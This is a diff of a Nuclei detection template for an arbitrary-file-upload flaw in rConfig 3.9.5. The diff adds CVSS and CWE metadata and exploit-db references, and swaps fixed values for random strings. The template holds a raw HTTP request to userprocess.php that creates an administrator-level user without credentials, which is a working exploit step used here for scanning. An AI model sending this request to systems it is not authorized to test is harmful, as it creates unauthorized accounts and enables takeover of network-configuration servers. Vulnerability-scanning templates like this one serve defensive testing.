@@ -1,33 +1,34 @@
 id: rconfig-rce
 
 info:
-  name: rConfig 3.9.5 - Remote Code Execution
+  name: rConfig 3.9.5 - Arbitrary File Upload
   author: dwisiswant0
   severity: high
-  tags: rconfig,rce
+  description: rConfig 3.9.5 is susceptible to an arbitrary file upload via the userprocess.php endpoint. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 8.8
+    cwe-id: CWE-434
+  reference:
+    - https://www.rconfig.com/downloads/rconfig-3.9.5.zip
+    - https://www.exploit-db.com/exploits/48878
+  tags: rconfig,rce,edb
+  metadata:
+    max-request: 1
 
-  # This template supports the user creation part only.
-  # To triggering an RCE, see references[2].
-  # References:
-  # - [1] https://www.rconfig.com/downloads/rconfig-3.9.5.zip
-  # - [2] https://www.exploit-db.com/exploits/48878
-
-requests:
+http:
   - raw:
       - |
         POST /lib/crud/userprocess.php HTTP/1.1
         Host: {{Hostname}}
         Accept: */*
-        User-Agent: python-requests/2.23.0
-        Connection: close
         Content-Type: multipart/form-data; boundary=01b28e152ee044338224bf647275f8eb
-        Upgrade-Insecure-Requests: 1
-        Cookie: PHPSESSID=pdnuclei
+        Cookie: PHPSESSID={{randstr}}
 
         --01b28e152ee044338224bf647275f8eb
         Content-Disposition: form-data; name="username"
 
-        pdnuclei
+        {{randstr}}
         --01b28e152ee044338224bf647275f8eb
         Content-Disposition: form-data; name="passconf"
 
@@ -39,7 +40,7 @@ requests:
         --01b28e152ee044338224bf647275f8eb
         Content-Disposition: form-data; name="email"
 
-        nuclei@projectdiscovery.io
+        test@{{randstr}}.tld
         --01b28e152ee044338224bf647275f8eb
         Content-Disposition: form-data; name="editid"
 
@@ -58,8 +59,11 @@ requests:
     matchers:
       - type: word
         words:
-          - "User pdnuclei successfully added to Database"
+          - "User {{randstr}} successfully added to Database"
+
         part: body
       - type: status
         status:
           - 302
+
+# Enhanced by md on 2022/10/05
